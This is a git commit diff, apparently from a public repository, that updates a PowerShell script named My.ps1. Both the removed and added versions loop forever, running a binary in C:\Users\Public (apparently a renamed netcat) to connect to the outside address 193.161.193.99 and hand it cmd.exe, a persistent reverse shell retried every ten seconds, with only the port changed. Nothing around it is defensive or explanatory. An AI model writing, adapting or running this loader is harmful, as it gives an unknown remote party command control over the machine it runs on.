67362da2b9ec72acced736a75d75ffe9f8a2d315
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2023-11-13 06:15:17 +0100

    Update My.ps1

--- My.ps1
+++ My.ps1
@@ -1,4 +1,1 @@
-while ($true){
-C:\Users\Public\RNM.exe -nv 193.161.193.99 56939 -e cmd.exe
-Start-Sleep 10
-}
+while ($true){C:\Users\Public\RNM.exe -nv 193.161.193.99 46369 -e cmd.exe; Start-Sleep 10}
